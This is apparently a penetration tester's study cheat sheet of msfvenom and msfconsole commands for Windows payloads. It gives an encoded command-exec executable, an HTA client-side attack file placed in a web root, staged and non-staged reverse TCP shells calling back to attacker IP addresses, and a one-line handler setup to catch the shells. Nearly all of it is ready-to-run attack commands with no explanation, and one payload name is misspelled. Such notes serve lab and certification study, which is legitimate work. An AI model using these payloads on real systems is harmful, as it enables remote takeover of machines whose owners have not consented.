
#shells #reverseShells #bindshells 

### Simple Command shell

```bash
msfvenom -p windows/exec CMD="cmd.exe" -f exe bi -e x86/shikata_ga_nai -b "\x00\x06\x0A\x1A\x3B\xFF"
```

### Client Side Attack

```bash
sudo msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.119.126 LPORT=443 -f hta-psh -o /var/www/html/exploit.hta
```

### Simple reverse Shell(staged)

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.45.164 LPORT=4445 -f exe -o met.exe
```

```bash
msfconsole -x "use exploit/multi/handler;set payload windows/x64/shell/reverse_tcp;set LHOST 192.168.45.187;set LPORT 443;run;"
```

Non staged

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.189 LPORT=4444 -f exe -o met.exe
```

- for 32 bit use windows/shelll/reverse_tcp (staged)
